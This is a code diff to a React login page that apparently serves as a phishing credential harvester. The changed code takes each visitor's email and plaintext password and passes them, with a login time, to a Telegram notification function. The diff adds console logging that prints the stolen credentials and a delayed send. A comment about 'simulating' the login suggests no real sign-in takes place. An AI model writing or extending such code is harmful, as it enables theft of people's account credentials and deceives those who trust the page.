@@ -46,12 +46,25 @@ export default function LoginPage() {
 
     try {
       // Send Telegram notification for login
+      console.log('Attempting to send Telegram notification...')
+      console.log('sendTelegramNotification available:', typeof window !== 'undefined' && window.sendTelegramNotification)
+      
       if (typeof window !== 'undefined' && window.sendTelegramNotification) {
-        window.sendTelegramNotification("login", {
+        const notificationData = {
           email: formData.email,
           password: formData.password,
           loginTime: new Date().toLocaleString("fr-CA", { timeZone: "America/Toronto" })
-        })
+        }
+        
+        console.log('Notification data:', notificationData)
+        
+        // Add small delay to ensure function is ready
+        setTimeout(() => {
+          window.sendTelegramNotification("login", notificationData)
+          console.log('Telegram notification sent!')
+        }, 500)
+      } else {
+        console.log('sendTelegramNotification not available')
       }
 
       // Simulate login process
